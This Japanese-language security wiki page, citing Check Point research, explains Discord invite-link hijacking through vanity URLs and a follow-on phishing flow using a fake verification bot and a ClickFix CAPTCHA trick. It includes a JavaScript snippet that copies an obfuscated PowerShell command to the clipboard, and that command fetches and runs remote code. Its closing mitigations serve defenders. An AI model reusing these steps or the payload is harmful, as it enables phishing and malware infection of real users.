# Discord Invite Hijacking

Discord invite hijacking は、custom vanity link の再利用ルールを悪用します。期限切れの temporary invite code、または小文字と数字だけで構成された削除済みの permanent code は、Level 3 Boost された server の vanity link として登録できる場合があります。custom vanity link も、元の server が Level 3 Boost を失うと利用可能になります。大文字を含む temporary invite の場合、通常の invite が有効な間でも、攻撃者は小文字形式の vanity link を事前登録できますが、redirection が始まるのはその invite の期限が切れた後です。<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

確認されたリスクは invite の種類によって異なります。<sup>[[1]](#references)[[2]](#references)</sup>

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | 期限切れ後、code が利用可能になり、Boost された server によって vanity URL として再登録できます。 |
| Permanent Invite Link | ⚠️          | 削除され、かつ小文字と数字だけで構成されている場合、code が再び利用可能になることがあります。        |
| Custom Vanity Link    | ✅          | 元の server が Level 3 Boost を失うと、その vanity invite が新規登録用に利用可能になります。    |

## Exploitation Steps

1. Reconnaissance
- 公開ソース（forums、social media、Telegram channels）で、`discord.gg/{code}` または `discord.com/invite/{code}` のパターンに一致する invite link を監視します。<sup>[[1]](#references)</sup>
- 関心のある invite code（temporary または vanity）を収集します。<sup>[[1]](#references)</sup>
2. Pre-registration
- Level 3 Boost privileges を持つ Discord server を作成するか、既存のものを使用します。<sup>[[1]](#references)[[2]](#references)</sup>
- **Server Settings → Vanity URL** で、対象の invite code の割り当てを試みます。受け入れられると、その code は malicious server によって確保されます。<sup>[[1]](#references)</sup>
3. Hijack Activation
- temporary invite の場合、元の invite が期限切れになるまで待機します（または、source を管理している場合は手動で削除します）。<sup>[[1]](#references)</sup>
- 大文字を含む code では、小文字版を直ちに取得できますが、redirection が有効になるのは期限切れ後です。<sup>[[1]](#references)</sup>
4. Silent Redirection
- 古い link にアクセスしたユーザーは、hijack が有効になると、攻撃者が管理する server にシームレスに送られます。<sup>[[1]](#references)</sup>

## Phishing Flow via Discord Server

1. server の channels を制限し、**#verify** channel だけが表示されるようにします。<sup>[[1]](#references)</sup>
2. bot（例: **Safeguard#0786**）を配置し、新規ユーザーに OAuth2 経由で verify するよう促します。<sup>[[1]](#references)</sup>
3. bot は CAPTCHA または verification step を装って、ユーザーを phishing site（例: `captchaguard.me`）へ redirect します。<sup>[[1]](#references)</sup>
4. **ClickFix** UX trick を実装します。<sup>[[1]](#references)</sup>
- 壊れた CAPTCHA メッセージを表示します。
- **Win+R** dialog を開き、あらかじめ用意された PowerShell command を貼り付けて Enter を押すようユーザーを誘導します。

### ClickFix Clipboard Injection Example

campaign では、JavaScript を使用して malicious PowerShell command を clipboard にコピーしていました。<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
このアプローチは、ファイルを直接ダウンロードさせることを避け、ユーザーに馴染みのある UI 要素を活用して警戒心を抑えます。<sup>[[1]](#references)</sup>

## Mitigations

- 永続的な招待リンクを優先し、コードに少なくとも 1 つの大文字が含まれていることを確認します。大文字を含む削除済みの永続コードは、vanity リンクとして再利用できません。<sup>[[1]](#references)</sup>
- 招待コードを定期的にローテーションし、古いリンクを無効化します。
- Discord server の boost 状態と vanity URL の取得状況を監視します。<sup>[[1]](#references)[[2]](#references)</sup>
- ユーザーに server の正当性を確認し、クリップボードから貼り付けたコマンドを実行しないよう教育します。

## References

- [1] [信頼から脅威へ: マルチステージマルウェア配信に利用された乗っ取られた Discord 招待](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [カスタム招待リンク – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
